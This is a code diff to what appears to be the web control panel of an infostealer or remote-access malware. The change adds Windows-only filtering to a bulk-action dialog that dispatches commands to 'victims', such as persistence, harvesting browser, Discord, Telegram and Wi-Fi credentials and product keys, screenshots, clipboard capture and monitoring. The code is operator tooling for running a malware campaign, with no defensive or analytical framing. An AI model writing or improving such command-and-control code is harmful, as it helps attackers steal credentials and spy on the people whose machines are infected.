@@ -7,6 +7,7 @@ import { Badge } from '@/components/ui/badge';
 import { mutate, useApi } from '@/hooks/useApi';
 import { ApiError } from '@/lib/api';
 import { ACTION_MAP, actionDetail, versionAtLeast, type ActionDef } from '@/lib/actions';
+import { isWindows } from '@/lib/os';
 import type { Task, Victim } from '@/lib/types';
 
 const BULK_IDS = ['persist-on', 'persist-off', 'harvest', 'harvest-browsers', 'harvest-discord', 'harvest-telegram', 'harvest-wifi', 'harvest-productkey', 'screenshot', 'update', 'scan', 'clip-start', 'clip-stop', 'watch-on', 'watch-off', 'cancel-all'];
@@ -62,7 +63,9 @@ export function BulkDialog({
   const action: ActionDef | undefined = ACTION_MAP.get(id);
   const activeTasks = useApi<{ items: Task[] }>(open && id === 'cancel-all' ? '/tasks?status=running&limit=200' : null);
   const available = BULK_IDS.filter((value) => {
-    const minimum = ACTION_MAP.get(value)?.minAgent;
+    const action = ACTION_MAP.get(value);
+    if (action?.windowsOnly && !(victims.length > 0 && victims.every((victim) => isWindows(victim.os)))) return false;
+    const minimum = action?.minAgent;
     return !minimum || (victims.length > 0 && victims.every((victim) => versionAtLeast(victim.agentVersion, minimum)));
   });
 
